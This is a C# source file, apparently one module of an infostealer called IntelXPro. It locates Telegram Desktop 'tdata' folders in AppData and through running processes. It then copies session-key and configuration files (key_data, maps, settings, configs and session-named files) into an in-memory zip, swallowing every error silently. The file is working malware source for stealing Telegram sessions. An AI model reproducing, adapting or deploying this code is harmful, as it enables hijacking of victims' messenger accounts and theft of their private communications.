using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Telegram : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Telegram";
            Parallel.ForEach(FindAllMatches("tdata"), delegate (string tdata)
            {
                string targetPath = Path.GetFileName(tdata.Remove(tdata.Length - 6, 6)) + RandomStrings.GenerateHashTag();
                Copydata(tdata, targetPath, zip, counterApplications);
            });
            if (counterApplications.Files.Count > 0)
            {
                counter.Messangers.Add(counterApplications);
            }
        }

        private void AddIfMatch(FileInfo fileInfo, string entryPath, InMemoryZip zip)
        {
            string name = fileInfo.Name;
            if (name.EndsWith("s") && name.Length == 17)
            {
                zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
            }
            else if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data") || name.StartsWith("configs") || name.StartsWith("maps"))
            {
                zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
            }
        }

        private void Copydata(string sourceDir, string targetPath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            ConcurrentBag<string> matchedNames = new ConcurrentBag<string>();
            bool addedAny = false;
            Parallel.ForEach(Directory.GetFiles(sourceDir), delegate (string filePath)
            {
                try
                {
                    FileInfo fileInfo = new FileInfo(filePath);
                    if (fileInfo.Length <= 7120)
                    {
                        string entryPath = targetPath + "\\" + fileInfo.Name;
                        if (fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17)
                        {
                            matchedNames.Add(fileInfo.Name);
                        }
                        _ = counterApplications.Files.Count;
                        AddIfMatch(fileInfo, entryPath, zip);
                        if ((fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17) || fileInfo.Name.StartsWith("usertag") || fileInfo.Name.StartsWith("settings") || fileInfo.Name.StartsWith("key_data") || fileInfo.Name.StartsWith("configs") || fileInfo.Name.StartsWith("maps"))
                        {
                            addedAny = true;
                        }
                    }
                }
                catch
                {
                }
            });
            Parallel.ForEach(matchedNames, delegate (string name)
            {
                try
                {
                    string dirPath = Path.Combine(sourceDir, name);
                    dirPath = dirPath.Remove(dirPath.Length - 1);
                    if (Directory.Exists(dirPath))
                    {
                        Parallel.ForEach(Directory.GetFiles(dirPath), delegate (string filePath)
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(filePath);
                                if (fileInfo.Length <= 7120)
                                {
                                    string entryPath = targetPath + "\\" + Path.GetFileName(dirPath) + "\\" + fileInfo.Name;
                                    AddIfMatch(fileInfo, entryPath, zip);
                                    if ((fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17) || fileInfo.Name.StartsWith("usertag") || fileInfo.Name.StartsWith("settings") || fileInfo.Name.StartsWith("key_data") || fileInfo.Name.StartsWith("configs") || fileInfo.Name.StartsWith("maps"))
                                    {
                                        addedAny = true;
                                    }
                                }
                            }
                            catch
                            {
                            }
                        });
                    }
                }
                catch
                {
                }
            });
            if (addedAny)
            {
                counterApplications.Files.Add(sourceDir + " => " + targetPath);
            }
        }

        private List<string> FindInAppData(string folderName)
        {
            if (string.IsNullOrEmpty(folderName))
            {
                return new List<string>();
            }
            ConcurrentDictionary<string, byte> found = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
            string[] array = new string[2]
            {
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };
            foreach (string text in array)
            {
                if (string.IsNullOrEmpty(text) || !Directory.Exists(text))
                {
                    continue;
                }
                try
                {
                    Parallel.ForEach(Directory.EnumerateDirectories(text, "*", SearchOption.TopDirectoryOnly), delegate (string dir1)
                    {
                        try
                        {
                            string path = Path.Combine(dir1, folderName);
                            if (Directory.Exists(path))
                            {
                                found.TryAdd(Path.GetFullPath(path), 0);
                            }
                        }
                        catch
                        {
                        }
                    });
                }
                catch
                {
                }
            }
            return new List<string>(found.Keys);
        }

        private List<string> FindAllMatches(string folderName)
        {
            ConcurrentDictionary<string, byte> set = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
            Parallel.ForEach(ProcessWindows.FindFolder(folderName), delegate (string p)
            {
                set.TryAdd(p, 0);
            });
            Parallel.ForEach(FindInAppData(folderName), delegate (string p)
            {
                set.TryAdd(p, 0);
            });
            return new List<string>(set.Keys);
        }
    }

}
